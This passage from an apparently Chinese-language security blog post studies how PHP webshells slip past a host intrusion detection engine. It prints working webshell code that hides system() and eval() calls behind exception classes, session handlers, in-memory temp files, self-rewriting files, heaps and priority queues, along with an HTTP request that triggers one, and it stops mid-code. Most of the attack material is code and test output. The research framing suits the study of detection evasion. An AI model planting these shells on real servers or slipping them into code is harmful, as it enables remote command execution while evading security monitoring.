   public function sayHello() &#123;</span><br><span class="line">        echo &#x27;Hello &#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">trait World &#123;</span><br><span class="line">    public function sayWorld() &#123;</span><br><span class="line">        echo &#x27;World&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class MyHelloWorld &#123;</span><br><span class="line">    use Hello, World;</span><br><span class="line">    public function sayExclamationMark() &#123;</span><br><span class="line">        echo &#x27;!&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = new MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">$o-&gt;sayWorld();</span><br><span class="line">$o-&gt;sayExclamationMark();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后他 new了一个对象 通过OverflowException这个默认的类创建</p><p>抛出异常的一个类，</p><p>我们可以去官方文档看一下他有哪些属性和方法</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120056516.png" alt="image-20250804120056516"></p><p>这里可以看到我们传入了 一个get传参，第一个参数就是message，进行了赋值</p><p>且后面也调用了getmessage() ，进行赋值给$c</p><p>然后这里他还将 $arr 通过getmygid() 获得文件的所属组的id，进行赋值给$arr，</p><p>然后去进行了if判断，在33 的时候正好 能继续执行下面的代码，而且我们可以看一下</p><p>&#x2F;etc&#x2F;passwd，下面的 www-data 的组id是多少</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120451533.png" alt="image-20250804120451533"></p><p>可以看到这个是33，也就是可以成功执行下面的代码</p><p>最后执行 get_declared_traits()[0]</p><p>这个方法</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120611473.png" alt="image-20250804120611473"></p><p>可以看到 他的返回值是 已经定义的 所有 traits 的名称的数组，这里我们只定义了一个</p><p>所以就可以把system 取出来</p><p>最后也是拼接执行的代码</p><p>测试</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804120735694.png" alt="image-20250804120735694"></p><p>成功</p><p>然后这里这个异常的类有很多，都可以进行替换，一般的抛出异常肯定是有抛出异常信息这个的方法和属性的，</p><p>为什么能绕过呢？</p><p>这里我如此初始化：$a&#x3D; new JsonException($_GET[‘a’]); 于是，分别从危险函数和 用户传参两个路径来狙击动态跟踪，发生了新的绕过。除了JsonException以外，我发现  引擎对内置接口的getMessage 普遍不敏感，这样的内置类大致（未严格测试，其中可能 会有些类不支持getMessage方法）如下： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Error </span><br><span class="line">    ArithmeticError </span><br><span class="line">      DivisionByZeroError </span><br><span class="line">    AssertionError </span><br><span class="line">    ParseError </span><br><span class="line">    TypeError </span><br><span class="line">      ArgumentCountError </span><br><span class="line">  Exception </span><br><span class="line">    ClosedGeneratorException </span><br><span class="line">    DOMException </span><br><span class="line">    ErrorException </span><br><span class="line">    IntlException </span><br><span class="line">    LogicException </span><br><span class="line">      BadFunctionCallException </span><br><span class="line">        BadMethodCallException </span><br><span class="line">      DomainException </span><br><span class="line">      InvalidArgumentException </span><br><span class="line">      LengthException </span><br><span class="line">      OutOfRangeException </span><br><span class="line">    PharException </span><br><span class="line">    ReflectionException </span><br><span class="line">    RuntimeException </span><br><span class="line">      OutOfBoundsException </span><br><span class="line">      OverflowException </span><br><span class="line">      PDOException </span><br><span class="line">      RangeException </span><br><span class="line">      UnderflowException </span><br><span class="line">      UnexpectedValueException </span><br><span class="line">    SodiumException</span><br></pre></td></tr></table></figure><h3 id="0x08-SESSION"><a href="#0x08-SESSION" class="headerlink" title="0x08 SESSION"></a>0x08 SESSION</h3><p>如果动态引擎去检查，他应该没有SESSION，至少是在第一次的时候。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">session_start(); </span><br><span class="line">$_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line"> </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$_SESSION[&#x27;a&#x27;].&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line"> </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"> </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line"> </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p> 模式基本上是与之前相同的，不同之处在于引入了SESSION变量来干扰URL解析，不 知为何，这样一次就通过了检测。其实更加高级的方法应该是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$b = &quot;111&quot;; </span><br><span class="line">$c = &quot;222&quot;; </span><br><span class="line">session_start(); </span><br><span class="line"> </span><br><span class="line">$a = array( &quot;one&quot;=&gt;$c,&quot;two&quot;=&gt;&amp;$c ); </span><br><span class="line">$url = &quot;http://a/usr/&quot;.$_SESSION[&#x27;a&#x27;].&quot;?a=1&quot;; </span><br><span class="line">$d =parse_url($url); </span><br><span class="line"> </span><br><span class="line">if($d[&#x27;query&#x27;])&#123; </span><br><span class="line"> </span><br><span class="line">    $c=&quot;echo 111;&quot;; </span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line">else&#123; </span><br><span class="line">    $c=$_FILES[&#x27;useraccount&#x27;][&#x27;name&#x27;]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">var_dump($a[&quot;two&quot;]); </span><br><span class="line">eval($a[&quot;two&quot;]); </span><br><span class="line"> </span><br><span class="line">$_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>由于规则需要一次性执行成功，因此需要在文件末尾加入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ($_SESSION[&#x27;a&#x27;]!=&quot;#&quot;)&#123; </span><br><span class="line">    $_SESSION[&#x27;a&#x27;]=&quot;#&quot;; </span><br><span class="line">    print(1); </span><br><span class="line">    include(get_included_files()[0]); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>触发该WebShell的HTTP请求为： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /x.php HTTP/1.1 </span><br><span class="line">Host: x </span><br><span class="line">Content-Type: multipart/form-data;boundary=a; </span><br><span class="line">Content-Length: 101 </span><br><span class="line">Cookie: PHPSESSID=bkukterqhtt79mrso0p6ogpqtm; </span><br><span class="line"> --a </span><br><span class="line">Content-Disposition: form-data; name=&quot;useraccount&quot;; filename=&quot;phpinfo();&quot; </span><br><span class="line"> </span><br><span class="line">phpinfo(); </span><br><span class="line"> --a--</span><br></pre></td></tr></table></figure><p>这个方法其实也跟前面的 0x05是差不多的，利用的是 waf和服务器的差异性，这里我们就不做过多的分析了</p><h3 id="0x09-SESSION扩展"><a href="#0x09-SESSION扩展" class="headerlink" title="0x09 SESSION扩展"></a>0x09 SESSION扩展</h3><p>利用SessionHandlerInterface 扩展的接口可以神不知鬼不觉地执行特定函数，直 接看代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">class MySessionHandler implements SessionHandlerInterface </span><br><span class="line">&#123; </span><br><span class="line">    // implement interfaces here </span><br><span class="line">    public function close() </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement close() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function destroy($id) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement destroy() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function gc($max_lifetime) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement gc() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function open($path, $name) </span><br><span class="line">    &#123; </span><br><span class="line">        $path($name); </span><br><span class="line"> </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function read($id) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement read() method. </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    public function write($id, $data) </span><br><span class="line">    &#123; </span><br><span class="line">        // TODO: Implement write() method. </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$handler = new MySessionHandler(); </span><br><span class="line">session_set_save_handler($handler, true); </span><br><span class="line">session_name($_GET[&#x27;a&#x27;]); </span><br><span class="line">session_save_path(&#x27;system&#x27;); </span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>这里我们可以看到，他自建了一个SessionHandlerInterface，并重写了里面的方法进行了覆盖，也就是说</p><p>我们后面开启session_start() 的时候，会调用我们自己写的 方法，而不是系统自带的</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804121645979.png" alt="image-20250804121645979"></p><p>这是他系统自带的属性和方法，因为我们进行覆盖，可以不写下面具体的方法，只需要有这个方法名，他才不会报错，这里感觉跟之前做的dll劫持导出表有相似之处</p><p>这里我们是在open下做的代码执行，其实也可以在其他地方，但是他需要接收两个用户可控的地方</p><p>目前感觉只有 open 和write 可以</p><p>因为我们知道 sessionid是用户可控的，data 就是我们要写入的数据 ，可以测试一下</p><p>感觉不太像，这个data 他是序列化后的结果 ，无法 构造出我们想要的</p><p>所以还是只有open可以实现，因为path，和name 我们可以直接传入</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804122727273.png" alt="image-20250804122727273"></p><p>没问题成功执行了</p><h3 id="0x0A-内存"><a href="#0x0A-内存" class="headerlink" title="0x0A 内存"></a>0x0A 内存</h3><p>之前有考虑过写入文件后include，但是被规则禁止了，即便是include session文件也 不行，于是，想到了内存。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = new SplTempFileObject(1000000);</span><br><span class="line">$a-&gt;fwrite( $_GET[&#x27;a&#x27;]); </span><br><span class="line">$a-&gt;rewind(); </span><br><span class="line">substr(get_declared_classes()[70],4,6)($a-&gt;fgets()); </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>这里他用SplTempFileObject 这个类创建了a这个对象，我们知道 php中，创建对象的时候</p><p>会自动调用__construct这个魔术方法执行</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804132219798.png" alt="image-20250804132219798"></p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804132235224.png" alt="image-20250804132235224"></p><p>那就明白了，他这个给maxMemory 设置了大概1M 的大小，然后通过fwrite进行写入文件 给$a</p><p>然后又将指针移动向文件的开头，substr(get_declared_classes()[70],4,6) 构造system，之前讲个这个构造</p><p>，然后在通过$a-&gt;fgets()，读命令执行</p><p>测试</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804133847219.png" alt="image-20250804133847219"></p><p>这里为什么要设置1M ，目的是为了不让他在我们执行命令的过程中生成临时文件，绕过waf</p><p>只要是2M一下都行</p><h3 id="0x0B-修改自身"><a href="#0x0B-修改自身" class="headerlink" title="0x0B 修改自身"></a>0x0B 修改自身</h3><p>修改自身的洞都被认定为同一种绕过手法了，而且已经有人先提交，因此被忽略了，但 是仍然写出来供大家参考。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$s=&quot;Declaring file object\n&quot;; </span><br><span class="line">$d=$_SERVER[&#x27;DOCUMENT_ROOT&#x27;].$_SERVER[&#x27;DOCUMENT_URI&#x27;]; </span><br><span class="line">$file = new SplFileObject($d,&#x27;w&#x27;); </span><br><span class="line"> </span><br><span class="line">$file-&gt;fwrite(&quot;&lt;?php&quot;.&quot; eva&quot;.$s[3]); </span><br><span class="line">$file-&gt;fwrite(&quot;(\$_&quot;.&quot;GET&quot;.&quot;[a]);?&gt;&quot;); </span><br><span class="line"> </span><br><span class="line">include(get_included_files()[0]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>先定义了一个$s &#x3D; “Declaring file object\n”</p><p>然后通过$_SERVER[‘DOCUMENT_ROOT’].$_SERVER[‘DOCUMENT_URI’]拼接了一个字符串，我们打印看一下是什么，</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804134545321.png" alt="image-20250804134545321"></p><p>我们可以看到 $_SERVER 中是一个数组，然后 DOCUMENT_ROOT 是服务器网站的根目录，DOCUMENT_URI是文件的路径，拼接起来就是 &#x2F;var&#x2F;www&#x2F;html&#x2F;baypass&#x2F;demo11.php，就拿到了我们php的绝对路径</p><p>我还发现 ，SCRIPT_FILENAME 这个也可以直接拿到文件的绝对路径，用拼接的方式也可能是为了迷惑waf</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804134843626.png" alt="image-20250804134843626"></p><p>这几个其实都能用来利，</p><p>然后他 又通过SplFileObject这个类new了一个对象为$file 参数为 自己文件的绝对路径，mode是w</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804135151433.png" alt="image-20250804135151433"></p><p>我们可以看到 他正好第一个参数，第二个参数就是 文件名和mode，其他的都有默认值</p><p><code>$file-&gt;fwrite(&quot;&lt;?php&quot;.&quot; eval(\$s[3]);&quot;);</code> </p><p><code>$file-&gt;fwrite(&quot;(\$_&quot;.&quot;GET&quot;.&quot;[a]);?&gt;&quot;);</code> </p><p>然后他通过fwrite进行写文件</p><p>这里其实我有一个疑问，他这里为什么是追加不是覆盖呢？</p><p>查找资料发现</p><p>因为我们 new对象的时候mode用的是w</p><p><code>&#39;w&#39;</code>模式的特性是：</p><ul><li>打开文件时会<strong>清空原有内容</strong>（首次写入前文件已被截断）</li><li>但写入过程中，文件指针会<strong>自动向后移动</strong>，新的写入操作会从当前指针位置继续，形成连续追加</li></ul><p><strong>fwrite () 的指针移动机制</strong><br>每次调用<code>fwrite()</code>后，文件指针会自动移动到<strong>写入内容的末尾</strong>。因此：</p><ul><li>第一次<code>fwrite()</code>写入<code>&quot;&lt;?php&quot;.&quot; eva&quot;.$s[3]&quot;</code></li><li>指针移动到这段内容的末尾</li><li>第二次<code>fwrite()</code>从当前指针位置继续写入<code>&quot;(\$_GET[a]);?&gt;&quot;</code></li><li>最终两个字符串会被拼接在一起，形成完整内容：<?php eval($_GET[a]);?></li></ul><p>这里要避免$ 符被正确识别，所以要用\进行转义</p><p>也就是说我们写完后的指针在末尾!!!</p><p>最后用  get_included_files 进行获取 文件的路径</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804135949567.png" alt="image-20250804135949567"></p><p>这里我们也打印一下看看他是什么</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804140040813.png" alt="image-20250804140040813"></p><p>发现这里他只有一个元素也就是我们的文件名</p><p>测试执行一下</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804140337782.png" alt="image-20250804140337782"></p><p>发现自身的文件成功被修改为 我们想要的payload</p><p>直接的文件读写函数被禁止了，因此需要通过SplFileObject来写，由于需要一次性执行 和稳定触发，写入之后需要自己include自己。这种WebShell很有趣，就像是披着羊皮的 狼，上传的时候看起来平平无奇，被执行一次以后就完全变了模样。  沿用这个思路，还有一个点是可以写文件的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">print &quot;Declaring file object\n&quot;; </span><br><span class="line">$f=__FILE__; </span><br><span class="line">$file = new SplFileObject($f,&#x27;w&#x27;); </span><br><span class="line"> </span><br><span class="line">$a=array(&quot;&lt;?php /*&quot;, &quot;*/eva&quot;,&quot;(\$_GET[a]);&quot;); </span><br><span class="line">$file-&gt;fputcsv($a,&#x27;l&#x27;); </span><br><span class="line"> </span><br><span class="line">$file=null; </span><br><span class="line"> </span><br><span class="line">include(get_included_files()[0]); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个代码主要的方法就是写函数不一样 fputcsv</p><p>查查官方文档</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804163635726.png" alt="image-20250804163635726"></p><p><code>putcsv($a,&#39;l&#39;);</code>  这里我们传入$a是我们的payload ，也就是我们传入的这个数组，然后用l 来进行分割，也就是将逗号替换为了l，但是这里有两个逗号，正常替换是&lt;?php l eval ($_GET[a]);这里会多一个l所以我们用</p><p>&#x2F;* *&#x2F; 进行注释</p><p>测试</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164041643.png" alt="image-20250804164041643"></p><p>成功变为了我们想要的，只是多了一个双引号，但是并不影响我们执行</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164125480.png" alt="image-20250804164125480"></p><p>不同之处在于，这里使用的是fputcsv，此时，需要将写入文件以后所产生的分隔符进 行注释，因此在构造payload时需要花点心思。   更进一步，使用这个方法加载缓存也是可以的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">$s=&quot;Declaring file objecT\n&quot;; </span><br><span class="line"> </span><br><span class="line">$file = new SplTempFileObject(); </span><br><span class="line"> </span><br><span class="line">$file-&gt;fputcsv(explode(&#x27;m&#x27;,&quot;evam(\$_GET[m]);&quot;),&#x27;l&#x27;); </span><br><span class="line"> </span><br><span class="line">$file-&gt;rewind(); </span><br><span class="line">eval($file-&gt;fgets()); </span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>分析</p><p>他先创建了一个对象 用SplTempFileObject这个类</p><p>然后用这个类里面的方法来写payload</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164409628.png" alt="image-20250804164409628"></p><p>用法跟前面的差不多，先用 explode m 来分割 evam($_GET[m]); ，</p><p>分割后变成了 eva ($_GET[   ]);</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804164818967.png" alt="image-20250804164818967"></p><p>这样我们能就有一个3个元素的数组，然后他又用fputcsv   l，来进行分割(代替逗号)</p><p>变为了： eval($_GET[l])；所以我们传参的值是l</p><p>然后他重置了一下指针到开头，然后在用eval来执行文件内容</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165113938.png" alt="image-20250804165113938"></p><p>没问题</p><h3 id="0x0C-堆排序"><a href="#0x0C-堆排序" class="headerlink" title="0x0C 堆排序"></a>0x0C 堆排序</h3><p>动态查杀引擎根据模拟执行的情况来进行判断，那么我们能否将好的坏的掺在一起，这 就像一个箱子里面有个5球，按号码从大到小摆放好，按顺序取，想办法让引擎取到正常的 球，而我们执行的时候通过控制参数取到能变为WebShell的球。我先放入3个正常的球0、 7、8和一个恶意的球’system’，还有一个球我通过GET参数控制，暂且称之为x。  当x取大于8以上的数字时，会有一个最大堆（绿色为按最大堆顶点依次导出的顺序）：</p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165147644.png" alt="image-20250804165147644"></p><p><img src="/2025/07/30/HIDS-PHP-Webshell-Bypass-%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/image-20250804165153856.png" alt="image-20250804165153856"></p><p> 由此可见：不同的参数值，能够引发堆结构的改变。经过多次Fuzz测试，我发现HIDS 查杀引擎对第三种情况没有考虑，于是，我通过依次将i取1和i取2来提取变量$a和$b， 再通过 $a($b); 执行命令。  当然，在这种情况下，利用的Payload 只能是 x.php?a&#x3D;99;whoami 这种格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> </span><br><span class="line">$obj=new SplMaxHeap(); </span><br><span class="line">$obj-&gt;insert( $_GET[a] ); </span><br><span class="line">$obj-&gt;insert( 8 ); </span><br><span class="line">$obj-&gt;insert( &#x27;system&#x27; ); </span><br><span class="line">$obj-&gt;insert( 7 ); </span><br><span class="line">$obj-&gt;insert( 0 ); </span><br><span class="line">//$obj-&gt;recoverFromCorruption(); </span><br><span class="line">$i=0; </span><br><span class="line"> </span><br><span class="line">foreach( $obj as $number ) &#123; </span><br><span class="line">    $i++; </span><br><span class="line"> </span><br><span class="line">    if($i==1) &#123; </span><br><span class="line"> </span><br><span class="line">        $a = $number; </span><br><span class="line">    &#125; </span><br><span class="line">    if($i==2) &#123; </span><br><span class="line"> </span><br><span class="line">        $b = $number; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$a($b);</span><br></pre></td></tr></table></figure><p>分析 </p><h3 id="0x0D-优先级队列"><a href="#0x0D-优先级队列" class="headerlink" title="0x0D 优先级队列"></a>0x0D 优先级队列</h3><p>优先级队列与堆排序思想基本类似，不同的是，我这里使用优先级队列对system关键 词进行更细颗粒度的拆分。想办法让传参影响system每个字符的顺序。  请看样本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;,1); </span><br><span class="line">$objPQ = new SplPriorityQueue(); </span><br><span class="line"> </span><br><span class="line">$objPQ-&gt;insert(&#x27;m&#x27;,1); </span><br><span class="line">$objPQ-&gt;insert(&#x27;s&#x27;,6); </span><br><span class="line">$objPQ-&gt;insert(&#x27;e&#x27;,2); </span><br><span class="line">$objPQ-&gt;insert(&#x27;s&#x27;,4); </span><br><span class="line">$objPQ-&gt;insert(&#x27;y&#x27;,5); </span><br><span class="line">$objPQ-&gt;insert(&#x27;t&#x27;,$_GET[&#x27;a&#x27;]); </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$objPQ-&gt;setExtractFlags(SplPriorityQueue::EXTR_DATA); </span><br><span class="line"> </span><br><span class="line">//Go to TOP </span><br><span class="line">$objPQ-&gt;top(); </span><br><span class="line"> </span><br><span class="line">$m=&#x27;&#x27;; </span><br><span class="line">$cur = new ErrorException($_GET[&#x27;b&#x27;]); </span><br><span class="line">while($objPQ-&gt;valid())&#123; </span><br><span class="line">    $m.=$objPQ-&gt;current(); </span><br><span class="line">    $objPQ-&gt;next(); </span><br><span 